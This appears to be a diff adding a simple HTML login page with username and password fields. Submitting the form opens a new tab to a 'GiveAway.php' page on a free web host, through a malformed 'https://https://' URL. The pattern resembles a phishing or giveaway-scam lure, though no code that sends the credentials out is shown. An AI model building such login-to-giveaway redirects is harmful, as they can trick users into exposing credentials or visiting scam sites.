@@ -1,0 +1,25 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Login Example</title>
+    <script src="login.js"></script>
+    <script>
+        function openTab() {
+        window.open("https://https://jeremy-vieira.000webhostapp.com/GiveAway.php", "_blank");
+        }
+      </script>
+</head>
+<body>
+    <h1>Login</h1>
+    <form id="loginForm" onsubmit="openTab()">
+        <label for="username">Username:</label>
+        <input type="text" id="username" name="username" required>
+        <br>
+        <label for="password">Password:</label>
+        <input type="password" id="password" name="password" required>
+        <br>
+        <input type="submit" value="Login">
+    </form>
+    <span id="message"></span>
+</body>
+</html>
